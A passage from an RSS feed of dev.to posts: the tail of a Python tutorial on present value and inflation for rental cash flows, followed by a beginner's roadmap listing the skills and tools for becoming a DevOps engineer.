&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'PV'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Cash'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;inflation_rate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'Year'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;round&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cash_flow&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;Year&lt;/th&gt;
&lt;th&gt;Cash&lt;/th&gt;
&lt;th&gt;PV&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;800.0&lt;/td&gt;
&lt;td&gt;777.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;848.0&lt;/td&gt;
&lt;td&gt;799.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;899.0&lt;/td&gt;
&lt;td&gt;823.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;953.0&lt;/td&gt;
&lt;td&gt;847.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;1010.0&lt;/td&gt;
&lt;td&gt;871.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;




&lt;p&gt;&lt;strong&gt;If the value of the "Cash" &amp;gt; "PV", then you did everything right as an investor:&lt;/strong&gt; you beat the inflation rate and get "gross" returns from the rent payments. You earn money.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#bottom-line" class="anchor"&gt;
  &lt;/a&gt;
  Bottom Line
&lt;/h2&gt;

&lt;p&gt;Money has time value due to inflation, deflation, devaluation, etc.&lt;/p&gt;

&lt;p&gt;The present value of money helps investors decide the amount they should invest today to receive a particular amount of money with "Gain" in the future.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Take the PV, NPV, and FV (future value) concepts to apply them to calculate the output from your investment opportunities and get the time value of money at any given time.&lt;/strong&gt; Because a dollar you hold in your hand today is worth more than a dollar you expect to get tomorrow. Mainly because you could invest the dollar you are having now.&lt;/p&gt;




&lt;p&gt;If you want to learn more about finance and investment opportunities in general and today's world, you can become a reader of &lt;a href="https://ilonacodes.com/financial-tips-for-freeing-extra-money-for-investment/"&gt;my newsletter (+bonus: the cheat sheet on how to free extra monthly cash from your dev-salary for investment).&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Learn to invest with confidence!&lt;/p&gt;




&lt;p&gt;&lt;em&gt;Disclaimer: Author’s opinions are their own and do not constitute financial advice in any way whatsoever. Nothing published by IlonaCodes constitutes an investment recommendation, nor should any data or content published by IlonaCodes be relied upon for any investment activities.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Photo by Morgan Housel on Unsplash&lt;/em&gt;&lt;/p&gt;

</description>
      <category>python</category>
      <category>motivation</category>
      <category>programming</category>
      <category>finance</category>
    </item>
    <item>
      <title>DevOps Roadmap - become a DevOps engineer in 2021</title>
      <author>Mubbashir Mustafa</author>
      <pubDate>Sat, 02 Jan 2021 09:44:16 +0000</pubDate>
      <link>https://dev.to/mubbashir10/devops-roadmap-become-a-devops-engineer-in-2021-4hb8</link>
      <guid>https://dev.to/mubbashir10/devops-roadmap-become-a-devops-engineer-in-2021-4hb8</guid>
      <description>&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: The article reflects my thoughts and understanding - others may disagree with the content 🙏🏽&lt;/p&gt;




&lt;p&gt;&lt;strong&gt;What is DevOps (In my words)&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A cross-functional mindset that makes your team more agile&lt;/li&gt;
&lt;li&gt;The practice/culture to remove the barrier between developers (who develop apps, write code, are responsible for implementing feature requests, bug fixing, etc.) and operators (who deploy those apps, manage IT infrastructure/servers,  and are responsible for uptime, security, stability, scalability, etc.)&lt;/li&gt;
&lt;li&gt;Collaboration between operators, system administrators, DB administrators, developers, testers, etc. &lt;/li&gt;
&lt;li&gt;A movement that essentially prevents people from saying "but it works on my localhost"&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;&lt;strong&gt;How to become a DevOps guy - a roadmap? (from a technical standpoint)&lt;/strong&gt;:&lt;br&gt;
&lt;em&gt;ℹ️ I have compiled the list in an order that I would follow if I am just starting&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Computer Programming (any language will do - primarily, you should be able to write scripts)&lt;/li&gt;
&lt;li&gt;Linux/Unix/Posix Compliant OS (get comfortable with it)&lt;/li&gt;
&lt;li&gt;Basics of Computer Networking&lt;/li&gt;
&lt;li&gt;Containerization (Docker, Podman, CRI-o, etc. - try to go for &lt;a href="https://opencontainers.org/"&gt;OCI compliant one&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Container Orchestration (Docker Swarm, Kubernetes, Mesos, .etc)&lt;/li&gt;
&lt;li&gt;Cloud Platform (AWS, Azure, GCP, etc. - one important point here is that these cloud providers have so many products and it is assumed that you should be good in the ones that are needed in your workflow. For example, it is good to know how AWS Lex works, but it's not needed to become a DevOps engineer 🤷🏽‍♂️)&lt;/li&gt;
&lt;li&gt;Continuous Integration/Continous Deployment/Continous Delivery - CI/CD (CircleCI, Github Actions, Bitbucket Pipelines, Gitlab CI/CD, Jenkins, AWS Code Build, AWS Code Pipeline, GCP Cloud Build, .etc)&lt;/li&gt;
&lt;li&gt;Automation/Infrastructure as a Code or IaC (Terraform, Pulumi, Ansible, Chef, Puppet, Salt, Bamboo, .etc)&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;&lt;strong&gt;Notes&lt;/strong&gt;:&lt;br&gt;
You don't necessarily need to learn all of the available tools/services in a given category. For example, in the Cloud Platform section, the three big cloud providers out there have the following managed services for Kubernetes:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://aws.amazon.com/eks/"&gt;AWS-&amp;gt; (Elastic Kubernetes Service) EKS&lt;/a&gt;&lt;br&gt;
&lt;a href="https://cloud.google.com/kubernetes-engine"&gt;GCP-&amp;gt; (Google Kubernetes Engine) GKE&lt;/a&gt;&lt;br&gt;
&lt;a href="https://cloud.google.com/kubernetes-engine"&gt;Azure-&amp;gt; (Azure Kubernetes Service) AKS&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Knowing more than one is desirable but not a requirement. I believe if you can deploy on one platform you should be able to deploy on the other as well. &lt;/p&gt;

&lt;p&gt;Similarly in IaC, I would suggest you pick the ones that you generally enjoy working with or your potential employer/client is using. &lt;/p&gt;




&lt;p&gt;&lt;strong&gt;What's Next?&lt;/strong&gt;:&lt;br&gt;
Once you are done with the list your basics are completed and you are ready to take on DevOps engineer role. You will also discover new tools as well along the way, like:&lt;br&gt;
Helm (Kubernetes manager), Containerd (container runtime just like Docker, CRI-o), Packer (machine image builder for multiple platforms), Vagrant (headless virtualization), Prometheus (monitoring), Grafana (data visualization like Tableau, AWS Quicksight, .etc), Envoy (proxy like HA, Nginx, etc.), meshes (AWS Mesh, Istio, .etc) ....and many more 🤯 (so just don't be afraid, once your basics are strong you can give any and every tool a try and see if you enjoy it and if it's improving your workflow or it's just hype)&lt;/p&gt;

</description>
      <category>devops</category>
      <category>beginners</category>
    </item>
  </channel>
</rss>
